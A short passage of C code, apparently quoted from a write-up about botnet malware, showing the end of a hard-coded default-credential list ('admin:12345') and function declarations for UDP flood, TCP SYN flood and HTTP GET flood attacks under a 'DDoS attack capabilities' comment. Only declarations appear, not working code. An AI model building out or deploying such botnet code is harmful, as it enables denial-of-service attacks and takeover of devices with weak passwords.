    "admin:12345"
};

// DDoS attack capabilities
void attack_udp_flood(uint32_t target_ip, int duration);
void attack_tcp_syn(uint32_t target_ip, int port);
void attack_http_get(char *target_url);
```

**
